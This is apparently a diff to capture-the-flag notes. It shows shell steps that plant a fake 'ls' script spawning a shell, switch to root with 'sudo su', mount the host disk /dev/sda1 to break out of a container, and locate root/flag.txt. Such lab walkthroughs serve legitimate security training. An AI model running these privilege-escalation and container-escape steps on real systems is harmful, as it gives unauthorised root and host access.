@@ -5,9 +5,14 @@ OU
 mkdir -p /home/ctf/bin
 echo -e '#!/bin/sh\n/bin/bash' > /home/ctf/bin/ls
 chmod +x /home/ctf/bin/ls
+ls
 
 ctf@b697bcbb96f5:~$ sudo su
 
+mkdir -p /mnt/hola
+mount /dev/sda1 /mnt/hola
+
 root@b697bcbb96f5:/home/ctf# find  /mnt/hola/ -type f -name "*.txt" 2>/dev/null
+
 /mnt/hola/root/flag.txt
 
